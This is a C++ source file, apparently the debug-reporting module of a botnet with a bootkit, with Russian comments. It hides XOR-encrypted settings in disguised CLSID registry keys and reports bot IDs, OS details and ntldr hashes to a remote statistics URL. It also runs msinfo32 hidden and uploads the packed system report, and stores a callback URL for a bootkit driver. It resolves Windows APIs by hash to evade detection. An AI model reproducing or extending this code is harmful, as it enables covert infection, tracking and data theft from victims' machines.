#include <shlobj.h>

#include "BotCore.h"
#include "DbgRpt.h"
#include "CabPacker.h" 
#include "Plugins.h"
#include "Crypt.h"
#include "md5.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace DBGRPTDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>

// Структура настроек статистической отчетности
struct DebugReportSettings
{
	bool  Enabled;
	PCHAR StatPrefix;
	PCHAR StatUrl;
};

// Статистические переменные модуля DbgRpt.cpp
// Инициализируются в DebugReportInit()
static CRITICAL_SECTION     DbgRptCs;
static DebugReportSettings  DbgRptSettingDefault;
static DebugReportSettings* DbgRptSettings = NULL;


// Предварительно объявление методов
void DebugReportLoadSettings();
void DebugReportUpdateSettingsThread(void* Arguments);

// Инициализация статических переменных модуля.
// Должна вызыватся при старте до использования ф-ций модуля.
void DebugReportInit()
{
	DBGRPTDBG("DebugReportInit", "Start initialize debug reporting (DbgRptSettings=0x%X).", 
		DbgRptSettings);

	pInitializeCriticalSection(&DbgRptCs);
	
	DbgRptSettingDefault.Enabled = false;
	DbgRptSettingDefault.StatPrefix = "";
	DbgRptSettingDefault.StatUrl = "";
	
	DbgRptSettings = &DbgRptSettingDefault;

	// Запускам процесс чтения настроек из реестра
	// Необходимо для применения в процессах, которые не выполняют команд (explorer, winlogon и тд)
	StartThread(DebugReportUpdateSettingsThread, NULL);
}

// Ф-ция конструктор для структуры DebugReportSettings
DebugReportSettings* DebugReportAllocSettings(bool Enabled, 
	const char* StatPrefix, const char* StatUrl)
{
	DebugReportSettings* result = CreateStruct(DebugReportSettings);

	result->Enabled    = Enabled;
	result->StatPrefix = STR::New((PCHAR)StatPrefix);
	result->StatUrl    = STR::New((PCHAR)StatUrl);
	
	return result;
}

// Ф-ция деструктор для структуры DebugReportSettings
void DebugReportFreeSettings(DebugReportSettings* settings)
{
	if (settings == NULL) return;
	if (settings == &DbgRptSettingDefault) return;

	if (settings->StatPrefix != NULL) STR::Free(settings->StatPrefix);
	if (settings->StatUrl != NULL)    STR::Free(settings->StatUrl);
	
	FreeStruct(settings);
}

// Формирования строки UID с указанным префиксом
string GenerateUidAsString(const string& Prefix)
{
	string  uid = Prefix;
	PCHAR   uid_ptr = MakeMachineID();
	size_t  uid_size = m_lstrlen(uid_ptr);
	if (Prefix.Length() > 0) uid += "0";
	uid += uid_ptr;

	return uid;
}

// Формирования GUIDа из UIDа без префикса
string CreateGuidFromUid(const string& uid)
{
	string wide_uid;
	string guid;
	DWORD  parts[5] = {8, 4, 4, 4, 12};


	while (wide_uid.Length() < (8+4+4+4+12)) wide_uid += uid;

	guid += "{";
	const char* CurPtr = wide_uid.t_str();

	for (size_t i = 0; i < ARRAYSIZE(parts); i++)
	{
		if (i != 0) guid += "-";

		guid += string(CurPtr, parts[i]);
		CurPtr += parts[i];
	}

	guid += "}";
	return guid;
}

// Создание(или открытие, если уже был создан) ключа в реестре для сохранения 
// шифрованных настроек статистической отчетности
HKEY CreateSettingKey()
{
	// ВНИМАНИЕ: сейчас всё сохраняется в HKEY_LOCAL_MACHINE
	// Сделан задел на добавление сохранения еще и HKEY_CURRENT_USER, если этот 
	// даст плохие отстуки

	HKEY    roots[2] = {HKEY_LOCAL_MACHINE /*, HKEY_CURRENT_USER*/};
	HKEY    key = NULL;
	DWORD   dsp = 0;
	string  path;

	path = "Software\\Classes\\CLSID\\";
	path += CreateGuidFromUid(GenerateUidAsString(""));

	for (DWORD i = 0; i < ARRAYSIZE(roots); i++) 
	{
		DWORD create_key_result = (DWORD)pRegCreateKeyExA(roots[i],
			path.t_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, &dsp);

		if (create_key_result == ERROR_SUCCESS) return key;
	}

	return NULL;
}

// Получение изменяемого имени параметра. 
// Тоже используется UID без префикса
string GetValueName(const string& Suffix)
{
	string Uid = GenerateUidAsString("");
	string ValueName(Uid.t_str(), Uid.Length() - 5);

	ValueName += Suffix;

	DBGRPTDBG("GetValueName", "returning value_name='%s'", ValueName.t_str());

	return ValueName;
}

// Загрузка параметров команды installbkstat из реестра 
// одновременно с дешифровкой
bool DebugReportLoadParamList(string * ParamList)
{
	HKEY key = CreateSettingKey();

	DBGRPTDBG("DebugReportLoadParamList", "CreateSettingKey() result=0x%X", key);
	if (key == NULL) return false;

	BYTE    Buffer[1024];
	DWORD   ValueLength = sizeof(Buffer) - 1;
	DWORD   ValueType = 0;

	m_memset(Buffer, 0, sizeof(Buffer));

	DWORD query_value_result = (DWORD)pRegQueryValueExA(key, GetValueName("PL").t_str(), 0, 
		&ValueType, Buffer, &ValueLength);
	pRegCloseKey(key);

	DBGRPTDBG("DebugReportLoadParamList", "RegQueryValueEx() result=%u ValueType=%d",
		query_value_result, ValueType);

	if (query_value_result != ERROR_SUCCESS) return false;
	if (ValueType != REG_BINARY) return false;

	
	XORCrypt::Crypt(GenerateUidAsString("").t_str(), Buffer, ValueLength);
	*ParamList = string((const char*)Buffer, ValueLength);

	DBGRPTDBG("DebugReportLoadParamList", "Finished.(param_list='%s')", 
		(*ParamList).t_str());

	return true;
}

// Сохранение параметров команды installbkstat в реестр 
// одновременно с шифрованием
bool DebugReportSaveParamList(const string & ParamList)
{
	HKEY key = CreateSettingKey();

	DBGRPTDBG("DebugReportSaveParamList", "CreateSettingKey() result=0x%X", key);
	if (key == NULL) return false;

	string EncodedString = ParamList;
	XORCrypt::Crypt(GenerateUidAsString("").t_str(), (LPBYTE)EncodedString.t_str(), EncodedString.Length()+1);

	DWORD set_value_result = (DWORD)pRegSetValueExA(key, GetValueName("PL").t_str(), 0, REG_BINARY, 
		(const BYTE*)EncodedString.t_str(),
		EncodedString.Length()+1);
	pRegCloseKey(key);

	DBGRPTDBG("DebugReportSaveParamList", "RegSetValueEx() result=%u", set_value_result);
	if (set_value_result != ERROR_SUCCESS) return false;

	return true;
}

// Загрузка настроек из реестра в структуру настроек.
// Учитывается возможность работы в мультипоточной среде.
void DebugReportLoadSettings()
{
	string ParamList;
	bool ParamListLoaded  = DebugReportLoadParamList(&ParamList);

	DBGRPTDBG("DebugReportLoadSettings", "DebugReportLoadParamList() result=%d (ParamList='%s').",
		ParamListLoaded, ParamList.t_str());

	string PlugName   = GetCommandParamByIndex(ParamList.t_str(), 0);
	string StatPrefix = GetCommandParamByIndex(ParamList.t_str(), 1);
	string StatUrl    = GetCommandParamByIndex(ParamList.t_str(), 2);

	DBGRPTDBG("DebugReportLoadSettings",
		"Parsing arguments results: PlugName='%s' StatPrefix='%s' StatUrl='%s'",
		PlugName.t_str(), StatPrefix.t_str(), StatUrl.t_str()
		);


	DebugReportSettings* NewSettings = CreateStruct(DebugReportSettings);
	DebugReportSettings* OldSettings = NULL;

	// Если хотя бы один пустой параметр - то это означает что они неверно заданы 
	// и стука не включен.
	NewSettings->Enabled = (StatPrefix.Length() > 0) && (StatUrl.Length() > 0);

	// URL приходит без символа начала параметров
	// Поскольку раньше URL был с таки символом - просто добавляем его по умолчанию.
	StatUrl += "?";

	NewSettings->StatPrefix = STR::New(StatPrefix.t_str());
	NewSettings->StatUrl    = STR::New(StatUrl.t_str());

	// При замене необходимо защитить DbgRptSettings, потому что его могут читать где-то
	pEnterCriticalSection(&DbgRptCs);

	OldSettings = DbgRptSettings;
	DbgRptSettings = NewSettings;

	pLeaveCriticalSection(&DbgRptCs);

	DebugReportFreeSettings(OldSettings);
}

// Поток для обновления настроек для подсистемы сбора статистики
// Сделано для будущей команды обновления параметров статистики
// Обеспечивает общесистемное применение настроек через 10 минут после 
// установки новых параметров
void DebugReportUpdateSettingsThread(void* Arguments)
{
	while (true)
	{
		DBGRPTDBG("DebugReportUpdateSettingsThread", "Sleep 10 min");
		pSleep(10 * 60 * 1000);

		DebugReportLoadSettings();
	}
}

// Сохранение настроек в реестр.
void DebugReportSaveSettings(const char* ParamsList)
{
	DBGRPTDBG("DebugReportSaveSettings", "Started with ParamsList='%s'", ParamsList);
	
	// Сохраняем список параметров в реестр
	DebugReportSaveParamList(ParamsList);

	// Сразу же подгружаем их обратно для немедленного применения
	DebugReportLoadSettings();
}

// Получение копии настроек
// Копия делает из-за возможной работы в мультипоточной среде.
// Чтобы не делать защиту общих данных там, где их используют,
// делаем защиту только при загрузке и получении копии.
DebugReportSettings* DebugReportGetSettings()
{
	DebugReportSettings* result = NULL;

	// При чтении защищаемся от изменения текущего DbgRptSettings
	pEnterCriticalSection(&DbgRptCs);

	if (DbgRptSettings == &DbgRptSettingDefault)
	{
		DebugReportLoadSettings();
	}

	result = DebugReportAllocSettings(DbgRptSettings->Enabled, 
		DbgRptSettings->StatPrefix, DbgRptSettings->StatUrl);

	pLeaveCriticalSection(&DbgRptCs);

	return result;
}

// Запуск тестов работы загрузки/выгрузки/получения настроек
void DebugReportRunTests()
{
	DebugReportInit();

	// Загрузить список параметров
	DebugReportLoadSettings();

	// Сохранить список параметров
	DebugReportSaveSettings("param1 param2 param3");

	const char* params[] = 
	{
		"BkDrop.plug bktestt http://test.orh/gettes/tetst.php",
		"BkDrop.plug"
	};

	for (DWORD i = 0; i < ARRAYSIZE(params); i++)
	{
		// Сохранить список параметров
		DebugReportSaveSettings(params[i]);

		// Получить настройки
		DebugReportSettings* settings = DebugReportGetSettings();

		DBGRPTDBG("DebugReportTest",
			"Settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
			settings->Enabled, settings->StatPrefix, settings->StatUrl
			);

		DebugReportFreeSettings(settings);

		DBGRPTDBG("DebugReportTest","---------");
		DebugReportStepByName("100_trtr");
		
		DBGRPTDBG("DebugReportTest","---------");
		DebugReportSystem();
		
		DBGRPTDBG("DebugReportTest","---------");
		DebugReportBkInstallCode(0);
		
		DBGRPTDBG("DebugReportTest","---------");
		DebugReportUpdateNtldrCheckSum();
		
		DBGRPTDBG("DebugReportTest","---------");
		DebugReportCreateConfigReportAndSend();
		
		DBGRPTDBG("DebugReportTest","---------");
		DebugReportSaveUrlForBootkitDriver();
	}
}


void DebugReportStepByName(const char* StepName)
{
	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("DebugReportStepByName",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);

	DBGRPTDBG("DebugReportStepByName", "go to url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
}

void DbgRptSprintfA(char* buffer, const char* format, ...)
{
  va_list ptr;
  va_start(ptr, format);
  pwvsprintfA(buffer, format, ptr);
  va_end(ptr);
}

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
{
	CHAR path[MAX_PATH];

	pGetWindowsDirectoryA(path, MAX_PATH);
	path[3] = '\0';

	m_lstrcat(path, "ntldr");

	m_memset(Buffer, 0, BufferSize);

	string md5 = MD5StrFromFileA(path);

	if (md5.IsEmpty()) return NULL;
	if (BufferSize < 33) return NULL;

  	m_lstrcat(Buffer, md5.t_str());

	return Buffer;
}

void DebugReportSystem()
{
	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("DebugReportSystem",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	CHAR NtldrMd5Buffer[100];
	PCHAR OsInfo = NULL;
	PCHAR NtldrMd5 = NULL;

	OsInfo = GetOSInfo();
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "beforerbt");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "os", OsInfo);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);

	DBGRPTDBG("DebugReportSystem", "sending url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	MemFree(OsInfo);
	DebugReportFreeSettings(settings);
}

void DebugReportBkInstallCode(DWORD BkInstallResult)
{
	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("DebugReportBkInstallCode",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	CHAR value[50];

	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	m_memset(value, 0, sizeof(value));

	_pwsprintfA(value, "%u", BkInstallResult);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "bkinstall");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "val", value);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);
	
	DBGRPTDBG("DebugReportBkInstallCode", "sending url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
}

void DebugReportUpdateNtldrCheckSum()
{
	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("DebugReportUpdateNtldrCheckSum",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	CHAR NtldrMd5Buffer[100];
	PCHAR NtldrMd5 = NULL;

	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "csup");
	AddURLParam(Fields, "uid", BotUid.t_str());

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);

	DBGRPTDBG("DebugReportUpdateNtldrCheckSumm", "go to url='%s'", URL);
	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
}

PCHAR GetPathToMsInfo32()
{
	int FolderId = CSIDL_SYSTEM;
	const char* PathSuffix = "\\";

	OSVERSIONINFOEXA ver;

	m_memset(&ver, 0, sizeof(ver));
	ver.dwOSVersionInfoSize = sizeof(ver);

	if (!(BOOL)pGetVersionExA(&ver)) return NULL;

	if (ver.dwMajorVersion == 5)
	{
		FolderId = CSIDL_PROGRAM_FILES;
		PathSuffix = "\\Common Files\\Microsoft Shared\\MSInfo\\";
	}

	PCHAR Path = STR::Alloc(2 * MAX_PATH);
	m_memset(Path, 0, STR::Length(Path));

	pSHGetSpecialFolderPathA(NULL, Path, FolderId, false);
	m_lstrcat(Path, PathSuffix);
	m_lstrcat(Path, "msinfo32.exe");

	return Path;
}

void DebugReportSendSysInfo(PCHAR uid, PCHAR url, PCHAR path)
{
	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "storefile");
	AddURLParam(Fields, "uid", (PCHAR)uid);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, url, Params);

	DBGRPTDBG("DebugReportSendSysInfo", "sending url='%s'", URL);

	PMultiPartData Data = MultiPartData::Create();

	MultiPartData::AddFileField(Data, "rep", path, NULL);
	PCHAR Buffer = NULL;
	bool Result = HTTP::Post(URL, Data, &Buffer, NULL);

	DBGRPTDBG("DebugReportSendSysInfo", "HTTP::Post() result %d", Result);

	STR::Free(Buffer);
	MultiPartData::Free(Data);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DebugReportCreateConfigReportAndSend()
{
	PCHAR MsInfoPath = NULL;
	PCHAR MsInfoParam = NULL;
	PCHAR ReportPath = NULL;
	PCHAR CabPath = NULL;

	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("DebugReportCreateConfigReportAndSend",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;

	do
	{
		// Получаем путь к msinfo32.exe
		MsInfoPath = GetPathToMsInfo32();
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetPathToMsInfo32() return '%s;", MsInfoPath);
		if (MsInfoPath == NULL) break;

		// Временный файл для отчета
		ReportPath = File::GetTempNameA();
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetTempNameA() for report file return '%s;", ReportPath);
		if (ReportPath == NULL) break;

		MsInfoParam = STR::Alloc(2 * MAX_PATH);
		if (MsInfoParam == NULL) break;

		PROCESS_INFORMATION pi;
		STARTUPINFOA si;

		m_memset(&si, 0, sizeof(si));
		m_memset(&pi, 0, sizeof(pi));
		m_memset(MsInfoParam, 0, STR::Length(MsInfoParam));

		// Запускаем скрытно
		si.cb = sizeof(si);
		si.wShowWindow = SW_HIDE;
		
		m_lstrcat(MsInfoParam, " /report \"");
		m_lstrcat(MsInfoParam, ReportPath);
		m_lstrcat(MsInfoParam, "\"");
		
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateProcess('%s', '%s')",
			MsInfoPath, MsInfoParam);

		BOOL process_result = (BOOL)pCreateProcessA(MsInfoPath, MsInfoParam, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateProcess return %d.(ph=0x%X pid=%d)",
			process_result, pi.hProcess, pi.dwProcessId);

		if (process_result == FALSE) break;
		if (pi.hProcess == NULL) break;

		if (pi.hProcess != NULL)
		{
			DBGRPTDBG("DebugReportCreateConfigReportAndSend", "Waiting for msinfo32.");
			pWaitForSingleObject(pi.hProcess, INFINITE);
			pCloseHandle(pi.hProcess);
		}

		if (pi.hThread != NULL) pCloseHandle(pi.hThread);

		DWORD attributes = (DWORD)pGetFileAttributesA(ReportPath);
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "'%s' attibutes 0x%X.",
			ReportPath, attributes);
		if (attributes == INVALID_FILE_ATTRIBUTES) break;

		CabPath = File::GetTempNameA();
		HCAB CabHandle = CreateCab(CabPath);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateCab() return 0x%X.",
			CabHandle);

		if (CabHandle == NULL) break;

		AddFileToCab(CabHandle, ReportPath, "sysinfo.txt");
		CloseCab(CabHandle);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sending sysinfo report.");

		string BotUid = GenerateUidAsString(settings->StatPrefix);
		DebugReportSendSysInfo(BotUid.t_str(), settings->StatUrl, CabPath);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sysinfo report sent.");
	}
	while (false);

	if (ReportPath != NULL) pDeleteFileA(ReportPath);
	if (CabPath != NULL)    pDeleteFileA(CabPath);

	if (ReportPath != NULL) STR::Free(ReportPath);
	if (CabPath != NULL)    STR::Free(CabPath);
	if (MsInfoPath != NULL) STR::Free(MsInfoPath);

	DebugReportFreeSettings(settings);

	DBGRPTDBG("DebugReportCreateConfigReportAndSend", "finished.");
}

bool GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
{
	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("GetDriverUrl",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return false;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	m_memset(UrlBuffer, 0, UrlBufferSize);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);
	
	DBGRPTDBG("GetDriverUrl", "Url='%s':%u (buffer_size=%u)", URL, STR::Length(URL),
		UrlBufferSize);

	if (UrlBufferSize < (STR::Length(URL) - 1)) return false;

	m_lstrcpy(UrlBuffer, URL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
	
	return true;
}

void DebugReportStep1()
{
	CHAR NtldrMd5Buffer[100];
	PCHAR OsInfo = NULL;
	PCHAR NtldrMd5 = NULL;

	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("GetDriverUrl",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	OsInfo = GetOSInfo();
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "beforerbt");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "os", OsInfo);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);

	PP_DPRINTF("DebugReportStep1: sending url='%s'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	MemFree(OsInfo);
	DebugReportFreeSettings(settings);
}

void DebugReportStep2(DWORD BkInstallResult)
{
	CHAR value[50];

	DebugReportSettings* settings = DebugReportGetSettings();
	DBGRPTDBG("GetDriverUrl",
		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	m_memset(value, 0, sizeof(value));

	_pwsprintfA(value, "%u", BkInstallResult);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "bkinstall");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "val", value);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);
	
	PP_DPRINTF("DebugReportStep2: sending url='%s'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
}

bool DebugReportSaveUrlForBootkitDriver()
{
	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
	CHAR   url[500];
	DWORD  url_length = 0;
	HKEY   key;
	DWORD  opt = 0;

	if (!GetDriverUrl(url, sizeof(url))) return false;

	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegCreateKeyExW return 0x%X", key_created);
	if (key_created != ERROR_SUCCESS) return false;

	// Сохраняем на всякий пожарный с 0 в конце
	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
		(DWORD)plstrlenA(url));
	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegSetValueExW return 0x%X", url_value_set);
	if (url_value_set != ERROR_SUCCESS) return false;

	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "Url key set (url=%s).", url);

	pRegCloseKey(key);
	return true;
}
